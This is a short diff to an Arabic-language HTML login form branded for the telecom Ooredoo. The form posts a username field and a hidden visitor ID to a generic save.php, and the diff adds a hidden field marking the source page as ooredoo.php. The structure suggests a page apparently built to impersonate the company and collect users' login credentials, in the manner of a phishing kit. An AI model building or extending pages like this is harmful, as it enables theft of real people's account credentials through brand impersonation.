@@ -35,6 +35,7 @@
         <p class="sub-text">تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور.</p>
         <form id="loginForm" action="save.php" method="POST">
             <input type="hidden" name="visitor_id" id="form_visitor_id">
+            <input type="hidden" name="current_page" value="ooredoo.php">
             <div class="input-group">
                 <input type="text" name="ooredoo_user" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
             </div>
